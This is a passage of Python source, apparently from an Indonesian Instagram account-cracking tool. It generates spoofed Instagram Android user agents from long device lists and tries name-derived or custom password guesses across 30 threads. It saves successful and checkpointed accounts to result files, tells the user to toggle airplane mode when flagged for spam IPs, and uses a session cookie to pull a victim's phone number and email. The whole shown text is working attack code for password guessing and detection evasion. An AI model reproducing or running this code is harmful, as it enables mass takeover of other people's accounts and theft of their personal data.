		modelan = str(rc(['Infinix F98','Infinix G636','Infinix X6739','Infinix X507','Infinix Hot 10','Infinix X682B','Infinix X688B','Infinix PR652B','Infinix X689B','Infinix X689D','Infinix X689C','Infinix X662','Infinix X675','Infinix X6812','Infinix X6817','Infinix X6816C','Infinix X6816D','Infinix X668C','Infinix X665B','Infinix X510','Infinix X6826B','Infinix X666B','Infinix X6825','Infinix X665E','Infinix X6827','Infinix HOT 3','Infinix HOT 3 Pro','Infinix X6833B','Infinix X6835','Infinix X669','Infinix HOT 4','Infinix HOT 4 Lite','Infinix HOT 4 Pro','Infinix X559F','Infinix X559','Infinix X606B','Infinix X608','Infinix X623','Infinix X624','Infinix X625D','Infinix X650','Infinix X655D','Infinix X680B','Infinix X655F','INFINIX-X551','Infinix-X521','Infinix X573','Infinix X622','Infinix Hot V3','Infinix HOT4 LTE','Infinix X693','Infinix X695','Infinix X695C','Infinix X663','Infinix X697','Infinix X698','Infinix X670','Infinix X676C','Infinix X663D','Infinix X676B','Infinix X671B','Infinix X672','Infinix X6819','Infinix X677','Infinix-X600-LTE',
		'Infinix NOTE 2 LTE','Infinix NOTE 3','Infinix NOTE 3 Pro','Infinix X678B','Infinix X6710','Infinix X6716B','Infinix X572-LTE','Infinix X571','Infinix X604','Infinix X605','Infinix X610B','Infinix X690B','Infinix X656','Infinix X692','Infinix X683','Infinix X450','Infinix X5010','Infinix X401','Infinix S2','Infinix S2 Pro','Infinix X626B','Infinix X652A','Infinix X652B','Infinix X660C','Infinix X5515I','Infinix X609','Infinix X5514D','Infinix X5516B','Infinix X627','Infinix X653','Infinix X680D','Infinix X657C','Infinix X6511B','Infinix X6512','Infinix X6823C','Infinix X6515','Infinix X6516','Infinix X6517','Infinix X612B','Infinix X503','Infinix X511','Infinix X352','Infinix X351','Infinix X1000','Infinix X530','Infinix X6711','Infinix X6731','Infinix Y88','Infinix X509','Infinix X6821','Infinix Zero 3','Infinix Zero 4','Infinix Zero 4 Plus','Infinix X603','Infinix X6815D','Infinix X620B','Infinix X620','Infinix X687','Infinix X687B','Infinix X6820','Infinix X6811B','Infinix X6810','Infinix X6811',
		'RMX3630','RMX3663','RMX3661','RMX3686','RMX3617','RMX3771','RMX3740','RMX3741','RMX1805','RMX1801','RMX1821','RMX1851','RMX1827','RMX1911','RMX1971','RMX2030','RMX1925','RMX2001','RMX2063','RMX2040','RMX2002','RMX2151','RMX2170','RMX2103','RMX3085','RMX3241','RMX3081','RMX3151','RMX3381','RMX3521','RMX3474','RMX3472','RMX3393','RMX3491','RMX3612','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1941','RMX3063','RMX3201','RMX3263','RMX3191','RMX3197','RMX3265','RMX2020','RMX3581','RMX3690','RMX3501','RMX3627','RMX3511','RMX3830','RMX3760','RMX3710','RMX3311','RMX3551','RMX3301','RMX3709','RMX2202','RMX3360','RMX3031','RMX3370','RMX3357','RMX3562','RMX3563','RMX3371','RMX3708','RMX3700','RMX3350','RMX2193','RMX2161','RMX2050','RMX2156','RMX3242','RMX3171','RMX3286','RMX3572','RMX3395','RMX3396','RMX3430','RMX3516','RMX3235',
		'RMX3506','RMP2103','RMP2105','RMP2107','RMX2117','RMX2173','RMX3372','RMX3161','RMX2205','RMX3142','RMX3461','RMX3462','RMX3478','RMX3574','RMX1831','RMX3121','RMX3125','RMX3041','RMX3092','RMX3611','RMX3571','RMX3475','RMX2200','RMX2111','RMX1901','RMX1992','RMX1993','RMX1931','RMX2081','RMX2086','RMX2025','RMX2071','RMX2076','RMX2072','RMX2052','RMX2176','RMX2121','RMX3115','RMX1921','OPPO 1105','oppo 15','Oppo 3T','Oppo 62A','oppo6779','oppo6833','OPPO7273','Oppo 9A','Oppo A1','PHQ110','PCHM10','CPH2071','PCHM00','CPH2083','CPH2185','CPH2179','CPH2269','CPH2421','CPH2349','CPH2271','CPH2477','CPH2471','CPH1923','CPH1925','oppo A25','PADM00','OPPO A30','CPH2015','OB-OPPO A31c','PDVM00','CPH2137','OPPO_A33m','OPPO A33t','Oppo A34','PEFM00','PESM10','A37fw','OPPO A37t','OPPO A38','CPH1605','CPH1853','Oppo A4','OPPO A40','Oppo A400','OPPO A41','OPPO A42','OPPO A43',
		'OPPO A44','OPPO A45','OPPO A46','OPPO A47','OPPO A48','OPPO A49','CPH1809','CPH1933','OPPO A50','OPPO A51','CPH2069','CPH2127','PECM30','OPPO A53m','CPH2135','CPH2321','CPH2239','CPH2195','CPH2273','CPH2325','PEMM00','A102OP','OPPO A56','PFVM10','CPH1701','OPPO A57t','CPH2387','CPH2577','PHJ110','OPPO A59','OPPO A59m','OPPO A59st','OPPO A59t','CPH1909','CPH1901','CPH1717','CPH1801','Oppo A71A','CPH2067','PDYM10','OPPO A73','CPH2161','OPPO A73t','CPH2219','CPH2197','CPH2375','CPH1715','CPH2385','CPH2473','OPPO A77t','CPH2565','CPH2495','OPPO A79','OPPO A79k','OPPO A79t','PCDM00','PBBT00','PDBM00','CPH1729','CPH1827','OPPO A83t','CPH1938','CPH1937','CPH2021','CPH2059','PDKT00','CPH2123','PFGM00','CPH2203','CPH2365','PHA120','PFUM10','PFTM10','Oppo A98','PCEM00','CPH1851','CPH1920','CPH1903','A1603','OPPOCNM632','CPH1114','CPH1235','CPH1451','CPH1615','CPH1664','CPH1869',
		'CPH1929','CPH1985','CPH2048','CPH2107','CPH2238','CPH2261','CPH2331','CPH2332','CPH2351','CPH2389','CPH2451','CPH2491','CPH2499','CPH2513','CPH2515','CPH2519','CPH2521','CPH2523','CPH2525','CPH2529','CPH2551','CPH2553','CPH2557','CPH2569','CPH2579','CPH2589','CPH2591','CPH2643','CPH3475','CPH3669','CPH3682','CPH3731','CPH3776','CPH3785','CPH4125','CPH4275','CPH4299','CPH4395','CPH4473','CPH4987','CPH5286','CPH5841','CPH5947','CPH6178','CPH6244','CPH6271','CPH6316','CPH6519','CPH6528','CPH6697','CPH7338','CPH7364','CPH7382','CPH7532','CPH7577','CPH7948','CPH7991','CPH8153','CPH8346','CPH8347','CPH8363','CPH8393','CPH8467','CPH8472','CPH8534','CPH8686','CPH8893','CPH9177','CPH9226','CPH9659','CPH9667','CPH9716','CPH9763','CPH9839','CPH9929','oppo f 5','OPPO F1','GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083',
		'GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA',
		'GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D',
		'GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T',
		'GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','T-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750',
		"2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]))
		b1 = random.choice(['OPM1','OPM2','OPM3','OPM4','OPM5','OPM6','OPD1','QD1A','OPR6','TPR1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1','LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
		kode = rc(['98288242','99640911','99640905','99640911','102221279','117539695','98288239','144612598','143631574','127049003','126223520','94080603','96794590','90841939','333717253','450448598','505599011']) 
		basa = rc(['pt_BR','nl_NL','it_IT','uk_UA','de_DE','hu_HU','ru_UA','en_US','es_MX']) 
		basi = rc(['mt6762','mt6761', 'qcom','mt6768'])
		idin = rc(["1907","1820","1907","1802","V2110","V1100"])       
		ua1=f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; RANDOM; {modelan}; {idin}; {basi}; {basa}; {kode})"
		ua2=f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; samsung; {real}; {idin}; {basi}; {basa}; {kode})"
		ua3=f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; infinix; {infinix}; {idin}; {basi}; {basa}; {kode})"
		ua4=f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; IDIN; {b1}; {idin}; {basi}; {basa}; {kode})"
		#ua2="Instagram {versi} Android (29/10; 280dpi; 720x1381; motorola; motorola one macro; lima; mt6771; pt_BR; 566040970)"
		#ua4=f"Instagram {versi} Android (33/13; 440dpi; {pxl}; Xiaomi; 21081111RG; amber; mt6893; it_IT; 566040806)"
		#ua3=f"Instagram {versi} (iPhone15,2; iOS 16_0_3; en_US; en; scale=3.00; 1179x2556; 548339486)"
		#ua5=f"Instagram {versi} Android (30/11; 440dpi; {pxl}; Xiaomi/Redmi; M2004J19C; lancelot; mt6768; pt_BR; 566040621)"
		#ua6=f"Instagram 318.0.7.22.109 (iPhone12,1; iOS 16_6_1; pt_BR; pt; scale=2.00; 750x1624; 565151867)"
		random = rc([ua1,ua2,ua3,ua4])
		return random
		
	def ua_sam_idin(self):
		rr=random.randint
		rc=random.choice
		mereek = rc(["samsung","realme","OnePlus","LAVA","TCL","motorola","Xiaomi/POCO","T790Y","Amazon","Google/google","Xiaomi","OPPO"])
	#	dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])q
		dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
		pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
		basa = random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
		andro = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
		xiaomi = random.choice(['M2004J19C','Redmi Note 9S','M2101K7AG','cepheus','Redmi Note 9 Pro','Redmi Note 8 Pro','220333QL','M2101K7BG','M2006C3MG','M2012K11G','2201117SG','M2010J19SL','M2006C3MG','2201117TY','M2003J15SC','2201117SY','23021RAAEG','M2101K7BI'])
		mod = random.choice(['galahad','curtana','sunny','cepheus','joyeuse','begonia','wind','secret','angelica','raphael','vili','taoyao','ginkgo','renoir','haydn','tapas','fleur','merlinnfc','spesn','pomelo','miel'])
		com = random.choice(["qcom","mt6833","mt6765","mt8168","mt6781","mt6765","mt6768","mt6785"])
		versi = self.vers()
		#Ua_Idin_Ganteng =f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/Redmi; {xiaomi}; {mod}; {com}; {basa})"
		Ua_Idin_Ganteng1 = f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; Idin/Samsung; {mereek}; {mod}; {com}; {basa})"
		Cinta_Idin = random.choice([Ua_Idin_Ganteng1])
		return Cinta_Idin
		#andro=rc(["30/11","31/12","29/10","24/7.0","21/5.0",'26/8.0.0'])
		#versi=rc(igve)
		#ua1=f"Instagram {versi} Android (30/11; 360dpi; {pxl}; motorola; moto g(9) play; guamp; qcom; pt_BR; 566040970)"
		#ua2="Instagram {versi} Android (29/10; 280dpi; 720x1381; motorola; motorola one macro; lima; mt6771; pt_BR; 566040970)"
		#ua4=f"Instagram {versi} Android (33/13; 440dpi; {pxl}; Xiaomi; 21081111RG; amber; mt6893; it_IT; 566040806)"
		#ua3=f"Instagram {versi} (iPhone15,2; iOS 16_0_3; en_US; en; scale=3.00; 1179x2556; 548339486)"
		#ua5=f"Instagram {versi} Android (30/11; 440dpi; {pxl}; Xiaomi/Redmi; M2004J19C; lancelot; mt6768; pt_BR; 566040621)"
		#ua6=f"Instagram 318.0.7.22.109 (iPhone12,1; iOS 16_6_1; pt_BR; pt; scale=2.00; 750x1624; 565151867)"
		#akusayang = random.choice([ua1,ua2,ua4,ua3,ua5,ua6])
		#return akusayang
		
	def vers(self):
		igv=("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,49.0.0.15.89,48.0.0.15.98,47.0.0.16.96,46.0.0.15.96,45.0.0.17.93,44.0.0.9.93,43.0.0.10.97,42.0.0.19.95,41.0.0.13.92,40.0.0.14.95,39.0.0.19.93,38.0.0.13.95,37.0.0.21.97,36.0.0.13.91,35.0.0.20.96,34.0.0.12.93,33.0.0.11.92,32.0.0.16.94,31.0.0.10.94,30.0.0.12.95,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
		igve=igv.split(",")
		versi=random.choice(igve)
		return versi
		
	def ingfo(self):
		prints(Panel(f"\t  [white]Hidupkan Mode Pesawat 10 Detik Jika Terdeteksi [blue]SPAM IP[/]",width=80,padding=(0,3),style=f"bold green"))
		prints(Panel(f''' {SE}╭─────────────────────────────────╮{SE} ╭───────────────────────────────────╮
 {SE}│ [white]result/[green]success-{day}.txt[/]{SE}  │ {SE}│ [white]result/[yellow]{K2}checkpoint-{day}.txt[/] {SE}│
 {SE}╰─────────────────────────────────╯{SE} ╰───────────────────────────────────╯''',title=f"[[white] Cek Hasil [/]]",width=80,style=f"bold green"))
	def ifo(self):
		urut = []
		print(f"{P} |-> [{U} 01 {P}] {HI}METODE IDIN IJO {P}=> {HI}WORK🔥\n{P} |-> [{U} 02 {P}] {HI}METODE IDIN KUN {P}=> {HI}WORK🔥")
		#urut.append(Panel(f"\r{P2}[{H2}01{P2}]\n{P2}[{H2}02{P2}]\n{P2}[{H2}03{P2}]\n{P2}[{H2}04{P2}]",width=8,style=f"bold green"))
		#urut.append(Panel(f"\r{P2}[{H2}METODE IDIN{P2}]\n{P2}[{H2}METODE API{P2}]\n{P2}[{H2}METODE API V2{P2}]\n{P2}[{H2}METODE IDIN V2{P2}]",width=70,style=f"bold green"))
		#self.tol.print(Columns(urut))
		#urut.append(Panel(f' [white][[blue]04[white]]. Method Ajax V1 [white] [[green]recommend[white]]\n [white][[blue]05[white]]. Method Ajax V2 [white] [[green]recommend[white]]\n [white][[blue]06[white]]. Method Ajax V3 [white] [[green]recommend[white]]',width=40,title=f"[white]Method Ajax",style=f"{color_table}"))
		self.tol.print(Columns(urut))
	def INFOdata(self, cookie):
		try:
			idin = s.get(f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 224.1.0.15.115 (iPhone11,6; iOS 15_4; it_IT; it-IT; scale=3.00; 1242x2688; 353721074)'},cookies={"cookie":cookie}).json()["form_data"]
			nomo, email = idin["phone_number"], idin["email"]
			return(nomo, email)
		except:
			return("None","None")
		#	nomo = link["phone_number"].replace("", "").replace(" ", "")
		#	email = link["email"]
		#	tggl = link["birthday"]
		#	year, month, day = tggl.split("-")
		#	month = bulan_ttl[month]
		#	tanggal = (f"{day} {month} {year}")
		#	fbid=x_jason["fbid"]
		#	pictures=x_jason["profile_pic_url"]
			#bio=x_jason["biography"]
		#except:
			#nomo = "-"
		#	email = "-"
		#	tanggal = "-"
		#	fbid = "-"
		#	pictures = "-"
		#	bio = "-"
	#	return nomo, email, tanggal, fbid, pictures, bio
	def passwordAPI(self,xnx):
		print('\r')
		prints(Panel(f"{P2}Total Username Terkumpul : {H2}{len(internal)}",width=80,padding=(0,20),style=f"{color_table}"))
		self.ifo()
		u = input(f'• Pilih Methode : ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["3","03"]:
			method.append('dua')
		elif u in ["4","05"]:
			method.append('tiga')
		elif u in ["2","02"]:
			method.append('empat')
		elif u in ["5","05"]:
			method.append('lima')
		elif u in ["6","06"]:
			method.append('enam')
		else:
			method.append('satu')
		urut=[]
		print(f"{P} |-> [{U} 01 {P}] {HI}PAKE PW INI {P}=> {HI}WORK🔥\n{P} |-> [{U} 02 {P}] {HI}JAMIN GACOR {P}=> {HI}WORK🔥")
		#urut.append(Panel(f"\r{P2}[{H2}01{P2}]\n{P2}[{H2}02{P2}]\n{P2}[{H2}03{P2}]\n{P2}[{H2}04{P2}]",width=8,style=f"bold green"))
	#	urut.append(Panel(f"\r{P2}[{H2}PASSWORD V1{P2}]\n{P2}[{H2}PASSWORD V2{P2}]\n{P2}[{H2}PASSWORD V3{P2}]\n{P2}[{H2}MANUAL WAK{P2}]",width=70,style=f"bold green"))
		#self.tol.print(Columns(urut))
		c=input(f'• Masukan Pilihan :{C} ')
		if c in ["01","1"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			prints(Panel(f"{P2}contoh password : sayang,anjing,bangsat",width=80,padding=(0,4),style=f"{color_table}"))
			zx=input(f'{N}• Tambahkan Password :{N} ')
			zz = zx.split(",")
			for i in zz:
				self.pwa.append(i)
			self.generateAPI(xnx,c,zx)		
		else:
			self.passwordAPI(xnx)
			
	def generateAPI(self,user,o,zx=''):
		self.ingfo()
		global prog,des
		prog = Progress(TextColumn('{task.description}'))
		des = prog.add_task('',total=len(user))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=clean(text=i.split("|")[1].lower(), no_emoji=True)
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
